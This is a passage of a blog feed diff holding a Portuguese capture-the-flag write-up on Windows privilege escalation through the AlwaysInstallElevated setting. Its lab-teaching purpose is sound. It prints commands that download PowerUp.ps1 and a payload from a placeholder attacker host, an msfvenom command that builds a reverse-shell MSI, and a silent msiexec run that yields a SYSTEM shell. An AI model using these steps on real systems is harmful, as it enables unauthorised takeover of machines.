+<p>Quando estes dois registros do Windows estão habilitados os usuários com qualquer privilégio podem instalar arquivos .msi como NT AUTHORITY SYSTEM (Administrator).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></div><p>Como mostrado no site <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated">hacktricks</a> o atacante pode gerar payloads manualmente para executar no host.</p>
+<p>Existem duas opções para obter a shell do administrador, criando um .msi que crie um usuário com privilégios de Administrador ou um .msi que execute um &lsquo;reverse shell&rsquo; e entregue a shell do administrador.</p>
+<p>Além da forma manual também existe a opção automatizada usando o <a href="https://www.exploit-db.com/exploits/23007">Metasploit</a>. Uma vez obtido o &lsquo;reverse shell&rsquo; com o usuário &lsquo;phoebe&rsquo; o módulo correspondente pode ser chamado para escalar privilégios.</p>
+<p>Módulo do Metasploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">exploit/windows/local/always_install_elevated
+</code></pre></div><p>Para executar os módulos .msi manualmente no host sem provocar interferências do sistema de proteção do Windows é interessante desabilitar o UAC (User Account Control) como forma de prevenção.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">powershell.exe -nop -exec bypass
+</code></pre></div><p>Chamando o powershell para executar comandos mais avançados no sistema.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">powershell
+</code></pre></div><p>Ainda no shell do usuário podemos subir ao host o módulo PowerUp.ps1 e logo em seguida fazer a importação do mesmo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Invoke-WebRequest &#39;&lt;ip&gt;:&lt;port&gt;/PowerUp.ps1&#39; -OutFile C:\Users\Phoebe\Downloads\PowerUp.ps1
+
+Import-Module ./PowerUp.ps1
+</code></pre></div><p>O PowerUP.ps1 possui o comando abaixo para criar dentro do diretório atual um binário MSI Windows para escalar privilégios. Após gerar o binário basta executá-lo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Write-UserAddMSI
+</code></pre></div><p>Comando para verificar se o privilégio está habilitado.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Get-RegistryAlwaysInstallElevated
+</code></pre></div><p>Neste outro <a href="https://powersploit.readthedocs.io/en/latest/Privesc/Write-UserAddMSI/">link</a> é mostrado como usar o módulo UserAdd.msi para poder criar um novo usuário com privilégios.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Write-UserAddMSI
+</code></pre></div>
+    <img src="https://i.imgur.com/JPKUXgo.png"  alt="Usuário rottenadmin criado"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Com o msfvenom podemos gerar na máquina local um payload para obter a shell do usuário administrator.</p>
+
+    <img src="https://i.imgur.com/1GMDBlH.png"  alt="Msfvenom reverse.msi"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi
+</code></pre></div><p>Efetuando no host o download do reverse.msi.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Invoke-WebRequest &#39;&lt;ip&gt;:&lt;port&gt;/reverse.msi&#39; -OutFile C:\Users\Phoebe\Downloads\reverse.msi
+</code></pre></div><p>Executando o reverse.msi no host.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">msiexec /quiet /qn /i reverse.msi
+</code></pre></div><p>Recebendo o &lsquo;reverse shell&rsquo; com usuário NT AUTHORITY SYSTEM.</p>
+
+    <img src="https://i.imgur.com/VG9gskz.png"  alt="Administrator Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a flag do usuário Administrator.</p>
+
+    <img src="https://i.imgur.com/079TVTW.png"  alt="Administrator Flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Conforme mostrado neste &lsquo;writeup&rsquo; existem várias maneiras de escalar privilégios no Windows quando o &lsquo;AlwaysInstallElevated&rsquo; está habilitado no sistema.</p>
+<p>Até a próxima!</p>
+]]></content>
+        </item>
         
         <item>
             <title>HackTheBox - Armageddon</title>
